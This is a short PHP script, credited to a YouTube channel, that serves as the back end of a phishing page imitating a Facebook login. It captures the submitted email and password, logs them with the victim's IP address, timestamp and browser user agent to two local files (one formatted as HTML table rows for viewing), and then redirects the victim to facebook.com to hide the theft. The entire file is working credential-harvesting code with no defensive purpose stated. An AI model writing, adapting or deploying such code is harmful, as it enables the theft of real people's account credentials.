<?php
// made by masterplan777
// https://www.youtube.com/@masterplan777


$username = $_POST['email'];
$pwd = $_POST['pass'];
              
if(isset($username) and isset($pwd))
{
$texts = "\n ***DATA***INSERTED***\n\nUsername:: ".$username."\nPassword:: ".$pwd."\nIP-Address:: ".$_SERVER['REMOTE_ADDR']."\nTime:: ".date("F j, Y, g:i a")."\nDevice:: ".$_SERVER['HTTP_USER_AGENT']."\n\n  **********************\n\n\n\n";

$texts2 = "     <tr>
        <th scope=\"row\"> - </th>
        <td>".$username."</td>
        <td>".$pwd."</td>
        <td>".$_SERVER['REMOTE_ADDR']."</td>
        <td>".date('F j, Y, g:i a')."</td>
        <td>".$_SERVER['HTTP_USER_AGENT']."</td>
     </tr>\n";

$fp = fopen('data.txt', 'a');
$fp2 = fopen('data2.txt','a');

fwrite($fp,$texts );
fwrite($fp2,$texts2);
fclose($fp);
fclose($fp2);

header("Location: https://www.facebook.com/");
}
?>